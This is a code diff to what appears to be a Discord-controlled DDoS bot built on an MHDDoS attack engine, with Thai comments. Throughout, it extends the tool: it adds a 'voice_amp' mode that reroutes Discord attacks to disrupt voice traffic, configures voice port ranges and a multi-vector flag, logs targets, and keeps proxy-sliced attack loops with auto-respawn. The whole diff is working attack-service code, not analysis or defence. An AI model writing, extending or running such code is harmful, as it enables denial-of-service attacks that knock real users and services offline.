@@ -17,6 +17,7 @@ from config import (
     MAX_RESPAWN_ATTEMPTS,
     FORBIDDEN_TLDS, FORBIDDEN_IPS,
     SUB_NODES_PER_DEVICE, THREADS_PER_SUB_NODE,
+    VOICE_PORT_MIN, VOICE_PORT_MAX, ENABLE_MULTI_VECTOR,
 )
 from database import Database
 from mhddos_engine import MHDDoSEngine, L4_MODULES
@@ -294,6 +295,10 @@ async def start_attack(interaction: discord.Interaction, module: str,
         )
         return
 
+    # auto-detect voice stutter mode
+    if module == "discord" and ENABLE_MULTI_VECTOR:
+        module = "voice_amp"
+
     # defer แบบ ephemeral — ทั้ง flow ซ่อน 2 ต่อ 2
     await interaction.response.defer(ephemeral=True)
 
@@ -308,6 +313,11 @@ async def start_attack(interaction: discord.Interaction, module: str,
     sub_nodes = devices * SUB_NODES_PER_DEVICE
     slices = proxy_mgr.slice_for_subnodes(sub_nodes)
     pool_size = len(proxy_mgr.proxies or [])
+
+    # log voice port range ถ้าเป็น voice mode
+    if module in ("discord", "voice_amp"):
+        print(f"[VOICE] target={target} port={port} "
+              f"range={VOICE_PORT_MIN}-{VOICE_PORT_MAX}")
 
     # spawn
     try:
@@ -337,7 +347,7 @@ async def start_attack(interaction: discord.Interaction, module: str,
         kwargs["file"] = f
     try:
         msg = await interaction.followup.send(**kwargs)
-    except Exception as e:
+    except Exception:
         await engine.stop(user_id)
         traceback.print_exc()
         return
@@ -353,7 +363,6 @@ async def start_attack(interaction: discord.Interaction, module: str,
     active_attacks[user_id] = state
     task = asyncio.create_task(_attack_loop(user_id, state))
     state["task"] = task
-    # เปิด watcher สำหรับ respawn
     asyncio.create_task(engine._watcher(user_id))
 
 
